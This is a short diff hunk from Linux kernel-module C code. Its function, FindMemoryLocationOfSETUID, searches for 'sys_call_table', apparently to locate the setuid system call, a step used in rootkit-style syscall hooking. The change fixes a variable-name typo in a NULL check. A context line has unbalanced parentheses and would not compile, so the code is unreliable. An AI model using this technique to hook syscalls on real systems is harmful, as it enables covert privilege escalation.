@@ -57,7 +57,7 @@ static int FindMemoryLocationOfSETUID()
 			if(strstr(p,"sys_call_table")) != NULL)
 			{
 				char* sysString = kmalloc(MAX_LEN,GFP_KERNEL);
-				if(sys_string == NULL)
+				if(sysString == NULL)
 				{
 					filp_close(filePointer,0);
 					set_fs(oldfs);
